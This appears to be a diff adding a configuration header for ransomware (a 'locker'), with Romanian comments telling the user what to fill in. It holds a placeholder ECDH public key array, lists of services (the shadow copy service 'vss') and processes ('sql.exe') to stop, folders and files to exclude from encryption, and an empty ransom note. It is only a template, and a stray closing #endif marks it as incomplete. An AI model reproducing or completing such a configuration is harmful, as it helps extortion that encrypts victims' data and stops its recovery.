@@ -1,0 +1,26 @@
+#ifndef __LOCKER_CONFIG__
+#define __LOCKER_CONFIG__
+unsigned char ecdhPubKey[144] = {
+    //se introduc 144 de valori hexazecimale
+};
+#endif
+const char16_t  *BLACKLIST_SERVICE[] =
+{
+	u"vss",
+	// se adaugă numele serviciilor care vor fi oprite
+};
+const char16_t *BLACKLIST_PROCESS[] =
+{
+	u"sql.exe",
+	// se adaugă numele proceselor care vor fi oprite
+};
+const char16_t *BLACKLIST_FILE[] =
+{
+	u"Windows",
+	// se adaugă numele folderelor care vor fi excluse
+	u"autorun.inf",
+	// se adaugă numele fișierelor care vor fi excluse
+};
+const CHAR  RANSOM_NOTICES[]  =  " ... \r\n"
+				// se adaugă un mesaj cu instrucțiunile pentru recuperarea datelor
+#endif
